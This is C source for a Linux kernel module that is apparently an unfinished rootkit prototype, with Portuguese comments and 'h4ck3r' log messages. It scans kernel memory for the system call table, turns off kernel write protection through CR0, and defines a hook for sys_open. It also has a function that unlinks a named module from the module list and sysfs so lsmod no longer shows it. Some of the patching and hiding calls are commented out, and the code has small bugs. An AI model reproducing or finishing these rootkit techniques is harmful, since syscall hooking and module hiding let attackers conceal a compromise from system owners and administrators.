#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/unistd.h>
#include <asm/pgtable.h>
#include <linux/slab.h>
#include <linux/syscalls.h>

unsigned long cr0;
static unsigned long *sys_call_table;
typedef asmlinkage long (*orig_open_t)(const char *, int, mode_t);
orig_open_t orig_open;

#define START_MEM PAGE_OFFSET
#define END_MEM ULONG_MAX

unsigned long *
get_syscall_table_bf(void) {
    unsigned long *syscall_table;
    unsigned long int i;

    for(i=START_MEM; i<END_MEM; i+=sizeof(void *)){
        syscall_table = (unsigned long *)i;

        if (syscall_table[__NR_close] == (unsigned long)sys_close)
            return syscall_table;
    }
    return NULL;
}

/* sys_open hook */
asmlinkage static int
hacked_open(const char __user *pathname, int flags, mode_t mode){
    printk(KERN_INFO "sys_open() hook!n");
    return orig_open(pathname, flags, mode);
}

//TODO
// criar funcao find module comparando o nome com o param
// e ai o lsmod taria pronto
static void module_hide(struct module *mod){
    list_del(&mod->list);
    kobject_del(&mod->mkobj.kobj);
    list_del(&mod->mkobj.kobj.entry);
}

static char *hide_mod = "";

module_param(hide_mod, charp, 0000);

static int __init
syshook_init(void) {
    sys_call_table = (unsigned long *)get_syscall_table_bf();
    cr0 = read_cr0();

    printk("module h4ck3r initiado\n");
    printk("%s\n", &THIS_MODULE->name);
    printk("%s\n", hide_mod);
    if(strcmp(hide_mod, "") != 0){
        struct module *mod;

        //mutex_lock(&module_mutex);
        mod = find_module(hide_mod);
        //mutex_unlock(&module_mutex);

        printk("Hiding %s", &mod->name);
        //hide_module(mod);
    } else printk("n veio args pro hidemod\n");

    //// serious stuff
    //module_hide(THIS_MODULE);
    if(sys_call_table == NULL){
        printk(KERN_INFO "sys_call_table not fount");
        return -1;
    }

    orig_open = (orig_open_t)sys_call_table[__NR_open];

    write_cr0(cr0 & ~0x00010000);
    //sys_call_table[__NR_open] = (unsigned long)hacked_open;
    write_cr0(cr0);

    return 0;
}

static void __exit
syshook_cleanup(void){
    if(orig_open){
        write_cr0(cr0 & ~0x00010000);
        //sys_call_table[__NR_open] = (unsigned long)orig_open;
        write_cr0(cr0);
    }
    printk("moduli h4ck3r tchautchau\n");

}

module_init(syshook_init);
module_exit(syshook_cleanup);
